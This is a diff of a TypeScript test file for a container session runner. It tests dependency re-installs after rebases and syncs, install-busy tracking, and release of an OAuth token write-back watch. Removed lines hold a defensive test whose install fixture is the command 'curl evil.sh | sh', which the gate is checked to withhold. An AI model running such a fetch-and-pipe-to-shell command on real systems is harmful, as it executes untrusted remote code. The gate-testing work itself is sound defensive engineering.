@@ -13,6 +13,12 @@ import type { Socket } from "node:net";
 import { ContainerSessionRunner } from "./container-session-runner.js";
 import { WorkerAbortedError } from "./worker-http.js";
 import { clearActivationState, getPluginPrepareFailures } from "./services/plugin-activation.js";
+import { dependencyGapAgentPrefix } from "./dependency-staleness.js";
+import {
+  hasTokenWriteBackWatch,
+  startTokenWriteBackWatch,
+  stopAllTokenWriteBackWatches,
+} from "./session-token-publisher.js";
 import type { WsServerMessage } from "../shared/types.js";
 import {
   DEFAULT_SUB_AGENT_TIMEOUT_MS,
@@ -34,10 +40,16 @@ function makeRunner(): ContainerSessionRunner {
 function priv(runner: ContainerSessionRunner): {
   isDepInputChange(paths: string[]): boolean;
   maybeReinstallForDepChange(): void;
+  /** Stands in for the worker's SSE `install_done` / `install_error`. */
+  signalInstallComplete(ok?: boolean, opts?: { unverified?: boolean }): void;
+  /** True once `runInstall` has armed the completion promise. */
+  _installInFlight: boolean;
 } {
   return runner as unknown as {
     isDepInputChange(paths: string[]): boolean;
     maybeReinstallForDepChange(): void;
+    signalInstallComplete(ok?: boolean, opts?: { unverified?: boolean }): void;
+    _installInFlight: boolean;
   };
 }
 
@@ -137,6 +149,337 @@ describe("ContainerSessionRunner — dependency-change reinstall throttle (#1622
     runner.setDepReinstallInputs([], []);
     const install = vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: true });
     priv(runner).maybeReinstallForDepChange();
+    expect(install).not.toHaveBeenCalled();
+  });
+});
+
+/**
+ * nikzlabs/shipit#2429 — a tree the ORCHESTRATOR rewrote (sync/rebase, rollback,
+ * reset onto the base) has to re-check its dependencies without waiting for an
+ * in-container inotify event that may never arrive.
+ *
+ * The reported failure was a rebase that brought in two new npm dependencies:
+ * the container kept the pre-rebase `node_modules`, the dev server started
+ * fine, and every request then failed on `Failed to resolve import` while
+ * `shipit service list` still reported the service as `running`.
+ */
+describe("ContainerSessionRunner — dependency re-check after an orchestrator tree rewrite (#2429)", () => {
+  beforeEach(() => vi.useFakeTimers());
+  afterEach(() => vi.useRealTimers());
+
+  it("re-runs the recorded install without being told which paths moved", () => {
+    const runner = makeRunner();
+    runner.setDepReinstallInputs(["npm ci"], ["package.json", "package-lock.json"]);
+    const install = vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: true });
+
+    runner.notifyWorkspaceRewritten();
+
+    // Unconditional by design: the worker's content-keyed install marker is the
+    // comparison, so an unchanged lockfile is a millisecond skip inside
+    // `runInstall` rather than a path diff reimplemented here.
+    expect(install).toHaveBeenCalledTimes(1);
+    expect(install).toHaveBeenLastCalledWith(["npm ci"]);
+  });
+
+  it("stays out of sessions whose install is not content-keyable — but says so", () => {
+    const runner = makeRunner();
+    // A codegen/shell install resolves to no dep inputs → a null deps hash that
+    // can never match the marker, so triggering here would reinstall from
+    // scratch on every sync. #1622's documented safe default is to do nothing.
+    runner.setDepReinstallInputs(["./build.sh"], []);
+    const install = vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: true });
+    const notices: string[] = [];
+    runner.onDependenciesUnverified = (m) => notices.push(m);
+
+    runner.notifyWorkspaceRewritten("rebase");
+
+    expect(install).not.toHaveBeenCalled();
+    // Not re-running is a defensible choice; not SAYING so is the bug the issue
+    // reported. The gap is what the service list reads, and the notice is what
+    // reaches the transcript.
+    expect(runner.dependencyGap).toEqual({
+      reason: "not-content-keyed",
+      rewrite: "rebase",
+      commands: ["./build.sh"],
+    });
+    expect(notices).toHaveLength(1);
+    expect(notices[0]).toContain("a sync onto the latest base");
+  });
+
+  it("says nothing when the session declares no install at all", () => {
+    const runner = makeRunner();
+    // Nothing to be out of step WITH: there is no dependency step, so a warning
+    // here would be a warning about a problem this session cannot have.
+    runner.setDepReinstallInputs([], []);
+    const notices: string[] = [];
+    runner.onDependenciesUnverified = (m) => notices.push(m);
+
+    runner.notifyWorkspaceRewritten("rollback");
+
+    expect(runner.dependencyGap).toBeNull();
+    expect(notices).toEqual([]);
+  });
+
+  it("reports a rewrite whose re-install failed, naming the rewrite", async () => {
+    const runner = makeRunner();
+    runner.setDepReinstallInputs(["npm ci"], ["package.json", "package-lock.json"]);
+    vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: false });
+    const notices: string[] = [];
+    runner.onDependenciesUnverified = (m) => notices.push(m);
+
+    runner.notifyWorkspaceRewritten("git-pull");
+    await vi.runAllTimersAsync();
+
+    // The gate latches `dependsOnInstall` services to `error`, which is loud —
+    // but it covers only gated services and never names the tree movement as
+    // the cause, which is the fact the reader is missing.
+    expect(runner.dependencyGap).toMatchObject({ reason: "install-failed", rewrite: "git-pull" });
+    expect(notices[0]).toContain("a git pull");
+  });
+
+  it("does not carry a rewrite into a later watcher-driven install", async () => {
+    const runner = makeRunner();
+    runner.setDepReinstallInputs(["npm ci"], ["package.json", "package-lock.json"]);
+    vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: false });
+
+    runner.notifyWorkspaceRewritten("rebase");
+    await vi.runAllTimersAsync();
+    expect(runner.dependencyGap).toMatchObject({ rewrite: "rebase" });
+
+    // A later edit-driven reinstall has nothing to do with that rebase, so
+    // attributing its failure to one would be an invented cause.
+    await vi.advanceTimersByTimeAsync(30_000);
+    priv(runner).maybeReinstallForDepChange();
+    await vi.runAllTimersAsync();
+    expect(runner.dependencyGap).toMatchObject({ reason: "install-failed" });
+    expect(runner.dependencyGap?.rewrite).toBeUndefined();
+  });
+
+  it("reports once for a burst of the same rewrite, again for a different one", () => {
+    const runner = makeRunner();
+    runner.setDepReinstallInputs(["./build.sh"], []);
+    const notices: string[] = [];
+    runner.onDependenciesUnverified = (m) => notices.push(m);
+
+    // Two steps of the same flow are one fact; repeating it trains the reader
+    // to skip the notice.
+    runner.notifyWorkspaceRewritten("rebase");
+    runner.notifyWorkspaceRewritten("rebase");
+    expect(notices).toHaveLength(1);
+
+    runner.notifyWorkspaceRewritten("pre-turn-reset");
+    expect(notices).toHaveLength(2);
+  });
+
+  it("clears the gap once an install proves the tree is installed", async () => {
+    // The worker's content-keyed marker matching IS the dependency check, so a
+    // `{ skipped: true }` answer is positive evidence — not an install that
+    // failed to happen. Driven through a real worker response rather than a
+    // `runInstall` spy, because the clear lives inside that funnel.
+    vi.useRealTimers();
+    const server = http.createServer((req, res) => {
+      res.setHeader("content-type", "application/json");
+      res.end(JSON.stringify(req.url === "/install" ? { skipped: true } : {}));
+    });
+    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
+    const addr = server.address();
+    if (typeof addr === "string" || !addr) throw new Error("no server address");
+    try {
+      const runner = makeRunner();
+      runner.setWorkerUrl(`http://127.0.0.1:${addr.port}`);
+      runner.setDepReinstallInputs(["./build.sh"], []);
+      runner.notifyWorkspaceRewritten("rebase");
+      expect(runner.dependencyGap).not.toBeNull();
+
+      await runner.runInstall(["./build.sh"]);
+
+      expect(runner.dependencyGap).toBeNull();
+    } finally {
+      server.close();
+    }
+  });
+
+  it("clears the gap when the install actually ran and succeeded", async () => {
+    // The sibling of the marker-skip case, and a DIFFERENT code path: the POST
+    // returns `{ started: true }` and the outcome arrives later over SSE, so the
+    // clear hangs off the awaited completion rather than the response.
+    vi.useRealTimers();
+    const server = http.createServer((req, res) => {
+      res.setHeader("content-type", "application/json");
+      // `running: true` on the status probe keeps the reconnect resync from
+      // synthesizing its own completion, so this test drives the real one.
+      res.end(JSON.stringify(req.url === "/install" ? { started: true } : { running: true }));
+    });
+    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
+    const addr = server.address();
+    if (typeof addr === "string" || !addr) throw new Error("no server address");
+    try {
+      const runner = makeRunner();
+      runner.setWorkerUrl(`http://127.0.0.1:${addr.port}`);
+      runner.setDepReinstallInputs(["./build.sh"], []);
+      runner.notifyWorkspaceRewritten("rebase");
+      expect(runner.dependencyGap).not.toBeNull();
+
+      const install = runner.runInstall(["./build.sh"]);
+      // Stand in for the worker's `install_done`, which the SSE stream would
+      // normally deliver.
+      await vi.waitFor(() => expect(priv(runner)._installInFlight).toBe(true));
+      priv(runner).signalInstallComplete(true);
+
+      expect(await install).toEqual({ ok: true });
+      expect(runner.dependencyGap).toBeNull();
+    } finally {
+      server.close();
+    }
+  });
+
+  /**
+   * `signalInstallComplete` defaults to `ok = true`, and two paths call it bare
+   * having observed no install at all: the reconnect resync's "not running and
+   * no last result" branch — whose own comment says it cannot tell success from
+   * failure — and `dispose()`, which only stops awaiters leaking. Both resolved
+   * the completion as a success, so `runInstall`'s `outcome.ok` test cleared the
+   * gap from nothing. `clearDependencyGap`'s docstring had asserted the opposite
+   * since #2429; the code never did it (found 2026-08-20).
+   */
+  it("keeps the gap when the completion was synthesized rather than observed", async () => {
+    vi.useRealTimers();
+    const server = http.createServer((req, res) => {
+      res.setHeader("content-type", "application/json");
+      res.end(JSON.stringify(req.url === "/install" ? { started: true } : { running: true }));
+    });
+    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
+    const addr = server.address();
+    if (typeof addr === "string" || !addr) throw new Error("no server address");
+    try {
+      const runner = makeRunner();
+      runner.setWorkerUrl(`http://127.0.0.1:${addr.port}`);
+      runner.setDepReinstallInputs(["./build.sh"], []);
+      runner.notifyWorkspaceRewritten("rebase");
+      expect(runner.dependencyGap).not.toBeNull();
+
+      const install = runner.runInstall(["./build.sh"]);
+      await vi.waitFor(() => expect(priv(runner)._installInFlight).toBe(true));
+      // What dispose() and the no-last-result resync do.
+      priv(runner).signalInstallComplete(true, { unverified: true });
+
+      expect(await install).toEqual({ ok: true, unverified: true });
+      expect(runner.dependencyGap).not.toBeNull();
+    } finally {
+      server.close();
+    }
+  });
+
+  it("keeps a gap that a FAILED install did not answer", async () => {
+    // The mirror of the test above, and the reason the clear cannot simply hang
+    // off "an install finished": a failed one is exactly when the gap is real.
+    vi.useRealTimers();
+    const server = http.createServer((req, res) => {
+      res.setHeader("content-type", "application/json");
+      res.end(JSON.stringify(req.url === "/install" ? { started: true } : { running: true }));
+    });
+    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
+    const addr = server.address();
+    if (typeof addr === "string" || !addr) throw new Error("no server address");
+    try {
+      const runner = makeRunner();
+      runner.setWorkerUrl(`http://127.0.0.1:${addr.port}`);
+      runner.setDepReinstallInputs(["./build.sh"], []);
+      runner.notifyWorkspaceRewritten("rebase");
+
+      const install = runner.runInstall(["./build.sh"]);
+      await vi.waitFor(() => expect(priv(runner)._installInFlight).toBe(true));
+      priv(runner).signalInstallComplete(false);
+
+      expect(await install).toEqual({ ok: false });
+      expect(runner.dependencyGap).toMatchObject({ reason: "not-content-keyed" });
+    } finally {
+      server.close();
+    }
+  });
+
+  /**
+   * The gap the runner exposes is what the turn-prompt builders read
+   * (`agent-execution.ts`, `dispatched-turn.ts`), so these check the join
+   * between the two: a rewrite has to leave the runner in a state that produces
+   * a usable `[System]` instruction, for either reason, without any surface
+   * having to be called first.
+   */
+  it("exposes a gap the turn prompt can push at the agent, for a skipped install", () => {
+    const runner = makeRunner();
+    runner.setDepReinstallInputs(["./build.sh"], []);
+
+    runner.notifyWorkspaceRewritten("rebase");
+
+    const prefix = dependencyGapAgentPrefix(runner.dependencyGap);
+    expect(prefix.startsWith("[System] ")).toBe(true);
+    // The declared commands, straight off the runner — the agent is told what to
+    // run rather than left to infer it from the repo.
+    expect(prefix).toContain("./build.sh");
+    expect(prefix).toContain("a sync onto the latest base");
+  });
+
+  it("exposes a gap the turn prompt can push at the agent, for a failed install", async () => {
+    const runner = makeRunner();
+    runner.setDepReinstallInputs(["npm ci"], ["package.json", "package-lock.json"]);
+    vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: false });
+
+    runner.notifyWorkspaceRewritten("git-pull");
+    await vi.runAllTimersAsync();
+
+    const prefix = dependencyGapAgentPrefix(runner.dependencyGap);
+    expect(prefix).toContain("FAILED");
+    expect(prefix).toContain("npm ci");
+    expect(prefix).toContain("a git pull");
+  });
+
+  it("contributes nothing to the turn prompt when the tree is believed installed", () => {
+    const runner = makeRunner();
+    runner.setDepReinstallInputs(["npm ci"], ["package.json", "package-lock.json"]);
+    vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: true });
+
+    runner.notifyWorkspaceRewritten("rebase");
+
+    // The healthy session is the overwhelmingly common one, and it must not pay
+    // a paragraph of prompt for a problem it does not have.
+    expect(runner.dependencyGap).toBeNull();
+    expect(dependencyGapAgentPrefix(runner.dependencyGap)).toBe("");
+  });
+
+  it("keeps the recorded gap when the notice hook throws", () => {
+    const runner = makeRunner();
+    vi.spyOn(console, "error").mockImplementation(() => {});
+    runner.setDepReinstallInputs(["./build.sh"], []);
+    runner.onDependenciesUnverified = () => { throw new Error("sqlite is unhappy"); };
+
+    // The hook reaches SQLite and the viewer transports. Losing the state to a
+    // failure there would restore exactly the silence this removes.
+    expect(() => runner.notifyWorkspaceRewritten("rebase")).not.toThrow();
+    expect(runner.dependencyGap).toMatchObject({ reason: "not-content-keyed" });
+  });
+
+  it("shares the #1622 cooldown rather than stacking a second install on it", async () => {
+    const runner = makeRunner();
+    runner.setDepReinstallInputs(["npm ci"], ["package.json", "package-lock.json"]);
+    const install = vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: true });
+
+    // A rebase fires this, and the watcher may then also report the same write.
+    runner.notifyWorkspaceRewritten();
+    priv(runner).maybeReinstallForDepChange();
+    expect(install).toHaveBeenCalledTimes(1);
+
+    await vi.advanceTimersByTimeAsync(30_000);
+    expect(install).toHaveBeenCalledTimes(2);
+  });
+
+  it("does nothing once the runner is disposed", () => {
+    const runner = makeRunner();
+    runner.setDepReinstallInputs(["npm ci"], ["package.json", "package-lock.json"]);
+    const install = vi.spyOn(runner, "runInstall").mockResolvedValue({ ok: true });
+    (runner as unknown as { _disposed: boolean })._disposed = true;
+
+    runner.notifyWorkspaceRewritten();
+
     expect(install).not.toHaveBeenCalled();
   });
 });
@@ -506,112 +849,101 @@ describe("ContainerSessionRunner — plugin prepare results (docs/262 req 13)", 
   });
 });
 
-/**
- * docs/271 / planning#400 — `runInstall` is the ONE place a session's
- * `agent.install` reaches the worker, so it is where the re-gate lives. These
- * exercise the short-circuit itself; the decision logic is covered in
- * `agent-install-gate.test.ts`.
- */
-describe("ContainerSessionRunner — withholding a changed agent.install (docs/271)", () => {
+describe("ContainerSessionRunner — an in-flight install counts as busy", () => {
   let dir: string;
-
   beforeEach(() => {
-    dir = fs.mkdtempSync(path.join(os.tmpdir(), "runner-install-gate-"));
-    // PRODUCTION SHAPE, and it is the whole point of this fixture: a runner is
-    // built with `session.workspaceDir` (`route-registry.ts:501`), i.e. the
-    // CLONE, not the session root — `app-lifecycle.ts:685` says so before taking
-    // `path.dirname` of it. A fixture that passes the root instead lets a gate
-    // that never fires in production pass every test.
+    dir = fs.mkdtempSync(path.join(os.tmpdir(), "runner-install-busy-"));
     fs.mkdirSync(path.join(dir, "workspace"), { recursive: true });
-    // A plugin container has been prepared for this session (req 12's evidence).
-    fs.mkdirSync(path.join(dir, "plugin-data", "probe", "state"), { recursive: true });
-    // `npm ci` is what last actually ran here.
-    const stateDir = path.join(dir, "state", "shared");
-    fs.mkdirSync(stateDir, { recursive: true });
-    fs.writeFileSync(
-      path.join(stateDir, ".install-done"),
-      JSON.stringify({
-        version: 2,
-        sourceCommit: "abc123",
-        runtimeKey: "node-22",
-        installCommands: ["npm ci"],
-        depsHash: null,
-        completedAt: "2026-08-17T00:00:00.000Z",
-      }),
-    );
   });
-
   afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));
 
-  /** Built exactly as production does: `sessionDir` IS the clone. */
-  function runnerIn(sessionRoot: string): ContainerSessionRunner {
-    return new ContainerSessionRunner({
-      sessionId: "s1",
-      sessionDir: path.join(sessionRoot, "workspace"),
-      defaultAgentId: "claude",
-      // Port 1 refuses connections: if the gate did NOT short-circuit, the POST
-      // would fail and surface as an `install_status` error instead of `ok`.
-      workerUrl: "http://127.0.0.1:1",
+  /**
+   * Disposing mid-install tears the container down while the worker is part-way
+   * through `npm ci`, and `dispose()` then resolves the completion `unverified`
+   * — correct, nothing was observed, but it leaves nothing downstream able to
+   * tell a half-installed tree from a finished one. The answer to "is this
+   * runner busy?" and the answer to "may it be disposed?" must not disagree.
+   */
+  it("counts an in-flight install as busy, so idle reclaim cannot dispose it", async () => {
+    const server = http.createServer((req, res) => {
+      res.setHeader("content-type", "application/json");
+      res.end(JSON.stringify(req.url === "/install" ? { started: true } : { running: true }));
     });
+    await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
+    const addr = server.address();
+    if (typeof addr === "string" || !addr) throw new Error("no server address");
+    try {
+      const runner = new ContainerSessionRunner({
+        sessionId: "s1",
+        sessionDir: path.join(dir, "workspace"),
+        defaultAgentId: "claude",
+        workerUrl: `http://127.0.0.1:${addr.port}`,
+      });
+      vi.spyOn(runner, "emitMessage").mockImplementation(() => undefined);
+      expect(runner.agentBusy).toBe(false);
+
+      const install = runner.runInstall(["npm ci"]);
+      await vi.waitFor(() => expect(priv(runner)._installInFlight).toBe(true));
+      expect(runner.agentBusy).toBe(true);
+
+      priv(runner).signalInstallComplete(true);
+      await install;
+      expect(runner.agentBusy).toBe(false);
+    } finally {
+      server.close();
+    }
+  });
+});
+
+/**
+ * docs/153 — the token write-back watch outlives its turn on purpose (a
+ * resident CLI rotates the shared OAuth token between turns), so the runner is
+ * where it has to END. Two exits, because a process can leave two ways.
+ */
+describe("ContainerSessionRunner — token write-back watch release (docs/153)", () => {
+  let tmpDir: string;
+
+  beforeEach(() => {
+    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "shipit-watch-release-"));
+    const file = path.join(tmpDir, "sessions", "s1", ".claude", ".credentials.json");
+    fs.mkdirSync(path.dirname(file), { recursive: true });
+    fs.writeFileSync(file, JSON.stringify({ claudeAiOauth: { expiresAt: 1_000 } }));
+  });
+
+  afterEach(() => {
+    stopAllTokenWriteBackWatches();
+    fs.rmSync(tmpDir, { recursive: true, force: true });
+  });
+
+  function armWatch(): void {
+    startTokenWriteBackWatch({
+      credentialsDir: tmpDir, sessionId: "s1", agentId: "claude",
+      pollIntervalMs: 10_000, debounceMs: 10_000,
+    });
+    expect(hasTokenWriteBackWatch("s1")).toBe(true);
   }
 
-  it("does not reach the worker, reports once, and is not a failure", async () => {
-    const runner = runnerIn(dir);
-    vi.spyOn(console, "warn").mockImplementation(() => undefined);
-    const reported: string[] = [];
-    runner.onInstallWithheld = (m) => reported.push(m);
-    const emit = vi.spyOn(runner, "emitMessage").mockImplementation(() => undefined);
-
-    const res = await runner.runInstall(["npm ci", "curl evil.sh | sh"]);
-
-    // A withheld install is not a failure — the session keeps working on the
-    // dependencies it already has (req 7).
-    // `withheld` is load-bearing, not cosmetic: `setupServiceManager` reads it
-    // to skip the overlay publish, which would otherwise stamp the rolling base
-    // with commands that never ran — laundering them into the gate's own anchor.
-    expect(res).toEqual({ ok: true, withheld: true });
-    expect(emit).not.toHaveBeenCalled();
-    expect(reported).toHaveLength(1);
-    expect(reported[0]).toContain("curl evil.sh | sh");
-    expect(reported[0]).toContain("npm ci");
-
-    // A second pass — the container recreate case — withholds again but stays
-    // quiet, so a user who has not acted does not collect one notice per resume.
-    const again = await runnerIn(dir).runInstall(["npm ci", "curl evil.sh | sh"]);
-    expect(again).toEqual({ ok: true, withheld: true });
-    expect(reported).toHaveLength(1);
+  it("releases the watch when a non-streaming turn's process exits", () => {
+    const runner = makeRunner();
+    armWatch();
+    // The real lifecycle: `finalizeSessionAgentEnvironment` ran at
+    // `agent_result` with the process still installed (so it kept the watch),
+    // and the slot is not cleared until `done`.
+    runner.setAgent(null);
+    expect(hasTokenWriteBackWatch("s1")).toBe(false);
   });
 
-  // The hook reaches SQLite and the viewer transports. `setupServiceManager`
-  // maps a throw out of `runInstall` to `{ ok: false }`, which latches every
-  // `dependsOnInstall` service to `error` — so a failure to REPORT must not
-  // become a failed install (req 7).
-  it("survives a throwing report hook without failing the install", async () => {
-    const runner = runnerIn(dir);
-    vi.spyOn(console, "warn").mockImplementation(() => undefined);
-    const err = vi.spyOn(console, "error").mockImplementation(() => undefined);
-    runner.onInstallWithheld = () => {
-      throw new Error("chat history is unavailable");
-    };
+  it("keeps the watch while a streaming process survives the slot being cleared", () => {
+    const runner = makeRunner();
+    runner.isStreamingActive = true;
+    armWatch();
+    // A WS reload recreates the proxy without the worker's CLI going anywhere.
+    runner.setAgent(null);
+    expect(hasTokenWriteBackWatch("s1")).toBe(true);
 
-    await expect(runner.runInstall(["curl evil.sh | sh"])).resolves.toEqual({
-      ok: true,
-      withheld: true,
-    });
-    expect(err).toHaveBeenCalled();
-  });
-
-  it("withholds silently when no reporting hook is wired", async () => {
-    const runner = runnerIn(dir);
-    vi.spyOn(console, "warn").mockImplementation(() => undefined);
-    const emit = vi.spyOn(runner, "emitMessage").mockImplementation(() => undefined);
-
-    // No `onInstallWithheld`: the gate's decision must not depend on whether
-    // anyone is listening.
-    await expect(runner.runInstall(["curl evil.sh | sh"])).resolves.toEqual({
-      ok: true,
-      withheld: true,
-    });
-    expect(emit).not.toHaveBeenCalled();
+    // Its genuine exit is the flag clearing — every caller kills or releases
+    // the resident process first.
+    runner.isStreamingActive = false;
+    expect(hasTokenWriteBackWatch("s1")).toBe(false);
   });
 });
